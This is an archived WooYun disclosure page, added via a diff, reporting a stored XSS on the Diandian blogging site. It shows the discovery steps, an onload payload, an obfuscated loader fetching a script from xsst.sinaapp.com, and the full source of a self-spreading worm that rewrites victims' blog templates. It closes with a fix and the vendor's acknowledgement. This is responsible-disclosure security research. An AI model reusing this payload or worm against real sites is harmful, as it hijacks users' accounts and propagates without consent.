@@ -1,0 +1,408 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		点点网存储型Xss  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		点点网存储型Xss  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-07-01 09:26</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-07-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-07-01：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-07-11：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-07-21：	细节向普通白帽子公开<br/>
+									2012-07-31：	细节向实习白帽子公开<br/>
+									2012-08-15：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">点点网某处编程缺陷导致存储型Xss。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">响应xsser的精神，分享就要写过程。<br />
+<br />
+<br />
+<br />
+--------------------------------<br />
+<br />
+<br />
+<br />
+1. 点点网，在xxx.diandian.com域下是允许自定义JS内容的，但是没有formkey的话，无非进行写操作，从而无法进行传播。分析了下，目测，点点应该是只把formkey暴露到了www.diandian.com这个域下。 因而，我们需要寻找www.diandian.com域下的xss或者其它方式来获取formkey才能进行后续的传播操作。 <br />
+<br />
+<br />
+<br />
+2. 带着这个目的，得去找www.diandian.com域下的xss。 首先我还是想到的FLASH，不过google了下，www.diandian.com域下搜索不到flash文件。 只能自己找，但是我才刚用点点，对点点的功能都不熟悉，有点无从下手的感觉。<br />
+<br />
+<br />
+<br />
+3. 还是打开google， 搜索 site:www.diandian.com -&quot;tag&quot; -&quot;content&quot; -&quot;category&quot; ... （屏蔽一些不可能存在XSS的关键词页面）。 看到一个页面<br />
+<br />
+<br />
+<br />
+http://www.diandian.com/blog/fm/iframe/reggaesky<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/010904147bcce2ec6024a782c4688a2c215e9d3d.jpg" target="_blank"><img src="../images/010904147bcce2ec6024a782c4688a2c215e9d3d.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+看了下页面源代码，可以看到左侧的tags是直接输出，而右侧的音乐专辑不在源码中，应该是.innerHTML方式输出。<br />
+<br />
+<br />
+<br />
+4. 直觉告诉俺，这个页面可能会有问题。于是回到自己博客发了一篇音乐，然后单独对<br />
+<br />
+<br />
+<br />
+http://www.diandian.com/blog/fm/iframe/wooyuntest （wooyuntest是俺测试帐号）这个页面进行分析。<br />
+<br />
+<br />
+<br />
+5. 首先测试了标签位置，&lt;, &gt; 被过滤，没戏<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/010903504c1408633e5651e100f2efed147ca4c7.jpg" target="_blank"><img src="../images/010903504c1408633e5651e100f2efed147ca4c7.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+6. 接着为了查看右侧是如何输出的，打开chrome的调试工具，搜索，cover-image,可以定位音乐专辑封面输出的相关JS文件，http://s.libdd.com/js/app/fm.$6765.js<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/010903321155e5b4d5521c0b8fde83241f9a4fc4.jpg" target="_blank"><img src="../images/010903321155e5b4d5521c0b8fde83241f9a4fc4.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7. 将这个JS的代码，复制到编辑器中。。显眼的语法高亮，让我眼前一亮。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01090317f1f8b18b5c0c0af35d07704f91aef376.jpg" target="_blank"><img src="../images/01090317f1f8b18b5c0c0af35d07704f91aef376.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8. 缺陷代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>var b=a.data,c=b.albumCover||&quot;&quot;;p=a.data,g(&quot;.music-info&quot;).fadeOut(&quot;100&quot;,function(){g(&quot;.cover-image&quot;).html(&quot;&lt;img src=&#039;&quot;+c+&quot;&#039;&gt;&quot;)</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这里src属性是用 &#039; 闭合的，如果src属性里允许输入&#039;，那么就将造成Xss。<br />
+<br />
+<br />
+<br />
+9. 基于此，我们编辑之前发送的那篇音乐帖子。<br />
+<br />
+<br />
+<br />
+POST http://www.diandian.com/edit/02c85840-c297-11e1-9a22-782bcb38253b<br />
+<br />
+<br />
+<br />
+其它参数在此不表。将album_logo 参数修改为：<br />
+<br />
+<br />
+<br />
+http://img.xiami.com/./images/album/img60/1260/66481314675280_1.jpg&#039; onload=&#039;alert(document.domain)//<br />
+<br />
+<br />
+<br />
+保存后，再打开http://www.diandian.com/blog/fm/iframe/wooyuntest<br />
+<br />
+<br />
+<br />
+看来这里没有过滤 &#039; ，如我们所愿的弹出了 www.diandian.com<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01090255e10eba6f1cf0b446198532150a9bafa9.jpg" target="_blank"><img src="../images/01090255e10eba6f1cf0b446198532150a9bafa9.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+10. 接下来就是漏洞的利用。 调用外部JS, http://xsst.sinaapp.com/diandian.js<br />
+<br />
+<br />
+<br />
+http://img.xiami.com/./images/album/img60/1260/66481314675280_1.jpg&#039; onload=&#039;window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,116,46,115,105,110,97,97,112,112,46,99,111,109,47,100,105,97,110,100,105,97,110,46,106,115);document.body.appendChild(window.s)//<br />
+<br />
+<br />
+<br />
+11. http://xsst.sinaapp.com/diandian.js 源码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>if(!window.__wooyun){<br />
+	//load jq<br />
+	var _s=document.createElement(&quot;script&quot;);<br />
+	_s.onload=function(){<br />
+		getBlogInfo();<br />
+	}<br />
+	_s.src=&quot;http://xsst.sinaapp.com/jq.js&quot;;<br />
+	document.body.appendChild(_s);<br />
+	window.__wooyun=2;<br />
+}<br />
+String.prototype.getMatch=function(reg){<br />
+	return (this.match(reg)||[&quot;&quot;,&quot;&quot;])[1];<br />
+};<br />
+function getBlogInfo(){<br />
+	$.get(&quot;http://www.diandian.com/wall&quot;,function(rs){<br />
+		var bid=rs.getMatch(/id=&quot;nav-blog-(\d+)&quot;/);<br />
+		var bname=rs.getMatch(/http:\/\/www\.diandian\.com\/dianlog\/([^&quot;]+)&quot;/);<br />
+		//get theme , check if the worm code exists.<br />
+		getTheme(bid,bname);<br />
+	});<br />
+}<br />
+function getTheme(id,name){<br />
+	//check if the user use theme<br />
+	$.get(&quot;http://www.diandian.com/customize/&quot;+name,function(info){<br />
+		var tid=info.getMatch(/usedThemeInfoId\s+=\s+(\d+)/);<br />
+		var callback=function(rs){<br />
+			if(rs.indexOf(&quot;__wooyun_worm&quot;)==-1){<br />
+				//if no worm then ..<br />
+				rs=rs.replace(/^\s+|\s+$/g,&quot;&quot;);<br />
+				rs=rs||decodeURIComponent(&quot;&quot;);<br />
+				rs=rs.replace(/^\d+\|+/,&quot;&quot;);<br />
+				rs=rs.replace(/&lt;body([^&gt;]*)&gt;/,&quot;&lt;body$1&gt;&lt;iframe src=\&quot;http://www.diandian.com/blog/fm/iframe/wooyuntest\&quot; style=\&quot;display:none\&quot; name=\&quot;__wooyun_worm\&quot;&gt;&lt;/iframe&gt;&quot;);<br />
+				saveTheme(id,name,rs,tid);<br />
+			}<br />
+		};<br />
+		//default - use blogId<br />
+		var data={<br />
+			&quot;formKey&quot;:DDformKey,<br />
+			&quot;blogId&quot;:id<br />
+		};<br />
+		if(tid){<br />
+			//use theme id<br />
+			data={<br />
+				&quot;formKey&quot;:DDformKey,<br />
+				&quot;themeId&quot;:id<br />
+			};<br />
+		}<br />
+		$.post(&quot;http://www.diandian.com/n/customize/source&quot;,data,callback);<br />
+	});<br />
+}<br />
+function saveTheme(id,name,rs,tid){<br />
+	$.post(&quot;http://www.diandian.com/n/customize&quot;,{<br />
+		&quot;formKey&quot;:DDformKey,<br />
+		&quot;themeInfoId&quot;:tid||&quot;0&quot;,<br />
+		&quot;userParams&quot;:&quot;{\&quot;模板色系\&quot;:{\&quot;paramType\&quot;:\&quot;Color\&quot;,\&quot;value\&quot;:\&quot;#0F3D5E\&quot;,\&quot;desc\&quot;:null},\&quot;背景颜色\&quot;:{\&quot;paramType\&quot;:\&quot;Color\&quot;,\&quot;value\&quot;:\&quot;#ECEEF0\&quot;,\&quot;desc\&quot;:null},\&quot;显示标签云\&quot;:{\&quot;paramType\&quot;:\&quot;Boolean\&quot;,\&quot;value\&quot;:false,\&quot;desc\&quot;:null},\&quot;每页文章数目\&quot;:{\&quot;paramType\&quot;:\&quot;Number\&quot;,\&quot;value\&quot;:\&quot;10\&quot;,\&quot;desc\&quot;:null}}&quot;,<br />
+		&quot;customCss&quot;:&quot;&quot;,<br />
+		&quot;blogName&quot;:name,<br />
+		&quot;blogDesc&quot;:&quot;&quot;,<br />
+		&quot;html&quot;:rs||&quot;&lt;html&gt;&lt;body&gt;&lt;iframe src=\&quot;http://www.diandian.com/blog/fm/iframe/wooyuntest\&quot; style=\&quot;display:none\&quot; name=\&quot;__wooyun_worm\&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/iframe&gt;&quot;,<br />
+		&quot;blogId&quot;:id,<br />
+		&quot;blogUrl&quot;:name<br />
+	},function(){<br />
+		try{<br />
+			console.log(&quot;worm ok...&quot;);<br />
+		}catch(e){<br />
+<br />
+		}<br />
+	});<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+12. 源码说明：<br />
+<br />
+<br />
+<br />
+A. 首先获取当前博客的个人信息，包括 blogId, blogName等<br />
+<br />
+B. 然后用此ID获取当前用户的模版代码，进行判断，如果不包含__wooyun_worm字样，则进行感染操作。<br />
+<br />
+C. 将用户原有的模版代码，插入 &lt;iframe src=&quot;http://www.diandian.com/blog/fm/iframe/wooyuntest&quot; style=&quot;display:none&quot; name=&quot;__wooyun_worm&quot;&gt;&lt;/iframe&gt;<br />
+<br />
+<br />
+<br />
+13. 在wooyuntest的模版代码中，插入 &lt;iframe src=&quot;http://www.diandian.com/blog/fm/iframe/wooyuntest&quot; style=&quot;display:none&quot; name=&quot;__wooyun_worm&quot;&gt;&lt;/iframe&gt;<br />
+<br />
+<br />
+<br />
+14. 当受害者访问 wooyuntest.diandian.com 时，其自己博客将会被感染。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">测试环境：Win7, IE9, Chrome <br />
+<br />
+<br />
+<br />
+漏洞测试效果:<br />
+<br />
+<br />
+<br />
+使用另外一个用户gainover，访问wooyuntest.diandian.com后，博客模版被感染，使得 gainover.diandian.com同样带有攻击性。<br />
+<br />
+<br />
+<br />
+被感染的受害者<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0109014759a47c0dea88ea481967864ab85aa484.jpg" target="_blank"><img src="../images/0109014759a47c0dea88ea481967864ab85aa484.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">因为你们对c里的双引号等都进行了转义，故<br />
+<br />
+<br />
+<br />
+将http://s.libdd.com/js/app/fm.$6765.js中的<br />
+<br />
+<br />
+<br />
+g(&quot;.cover-image&quot;).html(&quot;&lt;img src=&#039;&quot;+c+&quot;&#039;&gt;&quot;)<br />
+<br />
+<br />
+<br />
+修改为<br />
+<br />
+<br />
+<br />
+g(&quot;.cover-image&quot;).html(&quot;&lt;img src=\&quot;&quot;+c+&quot;\&quot;&gt;&quot;)<br />
+<br />
+<br />
+<br />
+即可。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-09086" title="点点网存储型Xss">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：14 </p>
+													<p class="detail">确认时间：2012-07-01 11:59</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢gainover &amp; 乌云!<br />
+<br />
+线上已经紧急修复.</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="9086";
+var bugRating="2";
+var myRating="";
+var ratingCount="4";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
